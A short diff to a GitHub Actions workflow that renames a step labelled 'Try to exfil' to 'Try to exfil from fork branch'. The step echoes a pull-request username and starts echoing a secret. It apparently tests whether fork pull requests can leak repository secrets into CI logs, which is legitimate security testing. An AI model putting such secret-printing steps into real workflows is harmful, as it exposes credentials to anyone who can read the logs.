@@ -36,7 +36,7 @@ jobs:
           name: "pr-${{github.run_id}}"
           path: pr/
 
-      - name: Try to exfil
+      - name: Try to exfil from fork branch
         run: |
           echo "USERNAME - ${{steps.pr_information.outputs.username}}"
           echo "SECRET -" 
